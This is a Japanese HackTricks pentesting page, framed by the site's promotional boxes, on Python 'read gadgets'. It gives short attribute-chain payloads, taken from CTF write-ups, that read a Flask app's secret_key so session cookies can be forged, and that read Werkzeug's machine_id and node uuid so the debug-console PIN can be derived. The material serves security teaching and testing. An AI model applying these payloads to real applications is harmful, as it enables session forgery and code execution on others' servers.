# Python Internal Read Gadgets

{% hint style="success" %}
AWSハッキングの学習と実践:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と実践: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
{% endhint %}

## 基本情報

[**Python Format Strings**](bypass-python-sandboxes/#python-format-string)や[**Class Pollution**](class-pollution-pythons-prototype-pollution.md)などのさまざまな脆弱性は、**Python内部データを読み取ることを可能にするが、コードの実行は許可されない**かもしれません。したがって、ペンテスターはこれらの読み取り権限を最大限に活用して、**機密特権を取得し脆弱性をエスカレート**させる必要があります。

### Flask - シークレットキーの読み取り

Flaskアプリケーションのメインページにはおそらく**`app`**というグローバルオブジェクトがあり、この中に**シークレットが設定**されているでしょう。
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
この場合、[**Pythonサンドボックス回避ページ**](bypass-python-sandboxes/)から**グローバルオブジェクトにアクセス**するために、どんなガジェットでもこのオブジェクトにアクセスすることが可能です。

**脆弱性が別のPythonファイルにある場合**、メインのファイルにアクセスするためにファイルをトラバースするガジェットが必要で、Flaskのシークレットキーを変更して[**このキーを知ることで権限を昇格**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)することができます。

[この解説](https://ctftime.org/writeup/36082)からの以下のようなペイロード：

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

このペイロードを使用して、`app.secret_key`（アプリ内の名前が異なる場合があります）を変更して、新しい特権のFlaskクッキーに署名できるようにします。

### Werkzeug - machine\_id と node uuid

[**この解説からのペイロードを使用すると**](https://vozec.fr/writeups/tweedle-dum-dee/)、**machine\_id** と **uuid** ノードにアクセスできるようになり、これらは[**Werkzeugピンを生成するために必要な主要な秘密**](../../network-services-pentesting/pentesting-web/werkzeug.md)です。**デバッグモードが有効になっている場合**、`/console` でPythonコンソールにアクセスするために使用できます。
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
{% hint style="warning" %}
**`app.py`**への**サーバーのローカルパス**を取得することができることに注意してください。これはウェブページで**エラー**を生成し、**パスを取得**します。
{% endhint %}

もし脆弱性が別のPythonファイルにある場合は、メインのPythonファイルからオブジェクトにアクセスするFlaskの以前のトリックをチェックしてください。

{% hint style="success" %}
AWSハッキングの学習と実践:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングの学習と実践: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksのサポート</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加**または[**telegramグループ**](https://t.me/peass)に参加し、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
{% endhint %}
